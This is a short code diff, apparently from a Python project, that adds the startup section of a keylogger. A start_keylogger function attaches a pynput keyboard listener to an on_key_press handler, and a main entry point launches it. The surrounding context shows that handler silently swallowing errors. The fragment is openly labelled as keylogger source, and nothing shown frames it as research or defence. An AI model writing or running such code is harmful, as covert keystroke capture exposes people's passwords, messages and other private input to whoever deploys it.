@@ -50,3 +50,13 @@ def on_key_press(key):
     except Exception:
         pass
 
+# === START THE KEYLOGGER ===
+def start_keylogger():
+    listener = pynput.keyboard.Listener(on_press=on_key_press)
+    listener.start()
+    listener.join()
+
+# === MAIN ENTRY POINT ===
+if __name__ == "__main__":
+    start_keylogger()
+
